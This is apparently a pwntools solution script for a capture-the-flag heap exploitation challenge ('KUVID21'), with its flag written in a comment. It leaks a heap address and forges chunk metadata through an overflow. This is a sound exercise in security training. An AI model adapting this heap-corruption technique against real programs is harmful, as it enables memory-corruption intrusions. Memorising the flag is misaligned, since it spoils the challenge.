from subprocess import Popen, PIPE
import sys
import random
import pwn
import time


#cd21{m1t1g4t10ns_4r3_n0_us3_4g41nst_m3}

def log(st):
    print(st)

class Block:
    def __init__(self, conn, index, info):
        self.conn = conn
        self.index = index
        self.info = info

    def cure(self):
        self.conn.recvuntil('Your choice:\n')
        self.conn.sendline(b'2')
        self.conn.recvuntil('Who to cure?\n')
        self.conn.sendline(str(self.index))

        res = self.conn.recvline().decode('ascii')
        log(f'cure {self.index}: {res}')
       
        line = self.conn.recvuntil('Alright').decode('ascii')
        return res

class Challenge:

    def __init__(self, conn):
        self.infectionCount = 0
        self.conn = conn

    def infect(self, first, last, allergies):
        log(f'Infecting #{self.infectionCount}')
        line = self.conn.recvuntil('Your choice:')
        self.conn.sendline(b'1')
        self.conn.recvuntil('Firstaddress:\n')
        self.conn.send(first)
        self.conn.recvuntil('Lastaddress:\n')
        self.conn.send(last)
        self.conn.recvuntil('Allergies:\n')
        self.conn.send(allergies)
        res = '\n'.join([line.decode('ascii') for line in self.conn.recvlines(4)])

        self.infectionCount += 1 

        log(res)
        return Block(self.conn, self.infectionCount - 1, res)

    def spread_virus(self, block_count):
        log(f'Virus is spreading to {block_count} blocks')
        time.sleep(5 * block_count)

        blocks = [Block(self.conn, i + self.infectionCount, 'infected by KUVID') for i in range(block_count)]
        self.infectionCount += block_count
        return blocks


def solve(challenge):

    # The virus allocates 0x100 bytes long blocks, if we 
    # fill up the 7 slots of the TCACHE, the next blocks of
    # this size will be moved to the small bucket list.
    # When freed, those blocks will merge free chunks before them

    blocks_to_fill_tcache = challenge.spread_virus(7)
    
    # separates the blocks to be kept in the TCACHE
    challenge.infect(b'x'*7, b'w'*7, f'e' * 0x22)

    block_to_be_corrupted = challenge.spread_virus(1)[0]

    challenge.infect(b'\x00', b'\x00', f'V4CC1N3V4CC1N3V4CC1N3V4CC1N3V4CC1N3')

    block_with_ptr_to_block_to_be_corrupted = challenge.spread_virus(1)[0]
    overflow_block_position = challenge.infect(b'x'*7, b'w'*7, f'e'*0x22)
    
    to_be_freed = challenge.spread_virus(1)[0]

    for block in blocks_to_fill_tcache:
        block.cure()

    block_with_ptr_to_block_to_be_corrupted.cure()
    block_to_be_corrupted.cure()

    overflow_block_position.cure()
    overflow_block = challenge.infect(
        b'x'*7, b'w'*7, b'e'*(0x24 - 8) + b'\x60\x02\x00\x00\x00\x00\x00\x00')

    r = challenge.infect(b'\x00', b'\x00', f'\x00').info
    r = r.split("\n")[0][32:(32+7*3-1)]

    address_bytes = [int(byte, 16) for byte in r.split(' ')]
    address = int.from_bytes(address_bytes,'little') 
    # the lowest byte of the address is masked (0x00)
    # but we know from the binary that it should be 0xe0
    # this is not affected by ASLR, because it doesnt modify the 
    # lowest 12 bits of the address
    # add 0x10 to shift the beginning of the block
    address += 0xe0 + 0x10
    address_bytes = address.to_bytes(8, 'little') 

    for i in range(3):
        challenge.infect(b'\x00', b'\x00', f'\x00')
    
    challenge.infect(
        b'\x88\x88\x88\x88', 
        b'\x00', (
            b'\x00\x00\x00\x00' +
            b'\x61\x02\x00\x00\x00\x00\x00\x00' +
            address_bytes +
            address_bytes
            
        ))

    to_be_freed.cure()

    log('heap corrupted')

    for i in range(7):
        challenge.infect(b'\x00', b'\x00', f'\x00')

    return challenge.infect(b'\x00', b'\x00', f'1N3\x00').cure()


pwn.context.log_level = 'error'
conn = pwn.remote('challenges.crysys.hu', 5009)
# conn = pwn.process('./KUVID21')
flag = solve(Challenge(conn))
print(flag)
